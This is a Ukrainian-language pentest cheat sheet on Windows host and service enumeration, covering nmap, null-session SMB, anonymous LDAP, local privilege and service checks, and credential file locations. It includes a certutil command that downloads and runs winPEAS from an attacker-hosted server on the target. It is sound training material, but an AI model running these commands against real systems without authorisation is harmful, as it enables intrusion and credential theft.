# Windows: Enumeration (host + service)

**Навіщо:** перше, що робити після будь-якого доступу (і ззовні, і в shell) — зібрати систему, юзерів, привілеї, сервіси, таски, мережу, шари. Звідси ростуть усі вектори privesc/lateral.
**Коли:** nmap показав Windows-порти, або отримано shell/сесію.
← [README](README.md) · [fundamentals](00-fundamentals.md) · далі: [privesc](03-privesc.md) · [credentials](04-credentials.md) · [AD](05-active-directory.md)

> Швидкий автозбір одним файлом — **winPEAS** (`winPEASx64.exe` / `winPEAS.bat`). Але ручний enum швидший для «одного питання» й працює там, де winPEAS ріжеться AV. Заливати: [file-transfer](../02-workflows/file-transfer.md).

---

## A. Ззовні (з Kali, до доступу)

### Крок 1. Порти → що за Windows
```bash
nmap -p- -T4 --min-rate 2000 --open $TARGET -oN win-all.txt
nmap -sCV -p 88,135,139,389,445,636,1433,3389,5985,5986,47001 $TARGET -oN win-svc.txt
```
**Як інтерпретувати:**
| Порт(и) | Висновок |
|---|---|
| 445/139 | SMB — null/guest enum, шари |
| **88 + 389/636** | **Domain Controller** → [AD](05-active-directory.md) |
| 3389 | RDP — доступ з кредами (`xfreerdp`) |
| 5985/5986 | WinRM — головний «shell» з Kali (`evil-winrm`) |
| 1433 | MSSQL — `sa`/слабкі креди → RCE через `xp_cmdshell` ([кроки](../03-cheatsheets/databases.md#mssql-1433)) |
| 135/47001 | RPC/WinRM-HTTP — непрямі ознаки |

### Крок 2. Enum без кредів (null / guest / anonymous)
```bash
netexec smb $TARGET                         # ОС, ім'я хоста, домен, signing, SMBv1
netexec smb $TARGET -u '' -p ''             # null session
netexec smb $TARGET -u 'guest' -p ''        # guest
netexec smb $TARGET -u '' -p '' --shares    # читабельні шари?
netexec smb $TARGET -u '' -p '' --users     # список юзерів (якщо дозволено)
netexec smb $TARGET -u '' -p '' --rid-brute # юзери через RID, коли --users закрито
enum4linux-ng -A $TARGET                     # комплексний dump (юзери/групи/шари/політики)
```
**Як інтерпретувати:** `[+] domain\\user` без пароля на `--users`/`--rid-brute` → є список юзерів → spraying/AS-REP. Читабельна шара → `smbclient`/`mount` і grep по ній ([SMB](../03-cheatsheets/smb-enum.md)).
**Обмеження:** сучасні Windows часто закривають null-session (`NT_STATUS_ACCESS_DENIED`) — тоді потрібні бодай guest або знайдені деінде креди.

### Крок 3. Anonymous LDAP (якщо 389 відкритий)
```bash
ldapsearch -x -H ldap://$TARGET -s base namingcontexts        # базовий DN (напр. DC=corp,DC=local)
ldapsearch -x -H ldap://$TARGET -b 'DC=corp,DC=local'         # дамп дерева (якщо анон-bind дозволений)
```
→ деталі enum домену: [AD](05-active-directory.md#ldap-enumeration).

---

## B. На хості (отримано shell) — локальний enum

### Система й патч-рівень
```cmd
whoami /all                       :: юзер, SID, групи, привілеї, integrity — найважливіше одразу
hostname & systeminfo             :: ОС, білд, домен, hotfix-и (для CVE)
echo %USERDOMAIN% & set           :: домен? змінні оточення (інколи креди/шляхи)
wmic qfe get HotFixID             :: встановлені патчі (прогалини → kernel-CVE)
```
PowerShell-еквіваленти:
```powershell
Get-ComputerInfo | Select OsName,OsVersion,OsBuildNumber,CsDomain
Get-HotFix | Sort InstalledOn -Desc | Select -First 15
```
**Інтерпретація:** `whoami /priv` із `SeImpersonatePrivilege` → одразу [privesc: Potato](03-privesc.md#1-зловживання-привілеями-токена). У групах `Administrators` → ти вже «адмін» (бери SYSTEM). `systeminfo` без свіжих hotfix + стара ОС → kernel-exploit як останній варіант.

### Користувачі, групи, привілеї
```cmd
whoami /priv                      :: привілеї токена (SeImpersonate/SeBackup/SeDebug?)
net user                          :: локальні юзери
net user <someuser>               :: деталі юзера (групи, останній вхід)
net localgroup                    :: групи
net localgroup Administrators     :: хто адмін
net accounts                      :: політика паролів/локаутів
query user  /  qwinsta            :: хто залогінений зараз (цікаво для impersonation/RDP)
```
```powershell
Get-LocalUser ; Get-LocalGroupMember Administrators
```

### Сервіси, процеси, scheduled tasks (вектори privesc)
```cmd
:: сервіси
sc query type= service state= all
wmic service get Name,PathName,StartName,State    :: StartName=LocalSystem + крива PathName = ціль
tasklist /v                                        :: процеси + від кого
:: scheduled tasks
schtasks /query /fo LIST /v | findstr /i "TaskName Run-As Task-To-Run"
```
```powershell
Get-CimInstance Win32_Service | ? {$_.StartName -match 'SYSTEM'} |
  Select Name,StartName,PathName,StartMode
Get-ScheduledTask | ? {$_.Principal.UserId -match 'SYSTEM|Admin'} |
  Select TaskName,@{n='Action';e={$_.Actions.Execute}}
```
**Інтерпретація:** сервіс від `LocalSystem` з бінаром у записуваній теці або з **unquoted path** (пробіл у шляху без лапок) → [privesc: сервіси](03-privesc.md#3-помилки-конфігурації-сервісів). Таск від SYSTEM, що запускає скрипт у записуваній теці → підміна скрипта.

### Мережа
```cmd
ipconfig /all                     :: інтерфейси, DNS (DNS=DC у домені)
arp -a                            :: сусіди в сегменті (цілі для lateral)
route print
netstat -ano                      :: слухаючі порти + PID (внутрішні сервіси → pivot)
netsh advfirewall show allprofiles
```
**Інтерпретація:** порт на `127.0.0.1`, недоступний ззовні → pivot ([pivoting](../02-workflows/pivoting-portforward.md), plink.exe). DNS-сервер = IP контролера домену — підказка, де DC.

### Шари, диски, інсталяції
```cmd
net share                         :: локальні шари
net use                           :: підключені мережеві диски (чужі креди?)
wmic logicaldisk get caption,description
wmic product get name,version     :: встановлений софт (вразливі версії) — повільно
dir /a C:\                         :: приховані теки/файли в корені
```

### Важливі директорії / файли (швидкий огляд)
```cmd
dir /a /s C:\Users\*\Desktop\ C:\Users\*\Documents\ 2>nul
type C:\inetpub\wwwroot\web.config 2>nul
dir C:\xampp\htdocs\ C:\inetpub\wwwroot\ 2>nul
```
Типові місця кредів/прапорців: `C:\Users\*\Desktop|Documents`, `C:\inetpub\wwwroot` (web.config), `C:\xampp`/`C:\wamp`, `C:\Program Files*\<app>\*.config`, `C:\Windows\System32\config` (SAM/SYSTEM, читаються лише з привілеями), `unattend.xml`/`sysprep.xml`.

---

## C. Авто-enum (winPEAS / Seatbelt-альтернатива)
```cmd
:: залити з Kali (python3 -m http.server 8000) → на цілі:
certutil -urlcache -f http://10.8.N.x:8000/winPEASx64.exe wp.exe & wp.exe
:: без .NET / коли .exe ріжеться:
certutil -urlcache -f http://10.8.N.x:8000/winPEAS.bat wp.bat & wp.bat
```
winPEAS покриває більшість перевірок цього файлу + privesc/creds автоматично й підсвічує «цікаве». Але він галасливий і повільний — для точкового питання швидше ручна команда вище.
> **Seatbelt** (GhostPack) — популярна альтернатива, але офіційних скомпільованих релізів немає (лише вихідний код C#). У репо **не покладений** свідомо (не шимо неперевірені бінарі). winPEAS покриває ту саму потребу; за потреби Seatbelt компілюється з https://github.com/GhostPack/Seatbelt.

---

## Часті помилки
- Запустити `whoami` замість `whoami /all` і `whoami /priv` — пропустити `SeImpersonate` (готовий SYSTEM).
- Не перевірити права на сервіси (`accesschk`) — пропустити найчастіший privesc.
- Побачити 88/389 і робити лише локальний enum, ігноруючи домен.
- Запускати лише winPEAS і не читати його вивід до кінця (ключове часто в середині).

## Джерела
- HackTricks — Windows local privilege escalation (checklist): https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
- HackTricks — Basic Win CMD/PS for pentesters: https://book.hacktricks.wiki/en/windows-hardening/basic-cmd-for-pentesters.html
- PEASS-ng (winPEAS): https://github.com/peass-ng/PEASS-ng
- netexec (ex-crackmapexec) wiki: https://www.netexec.wiki/
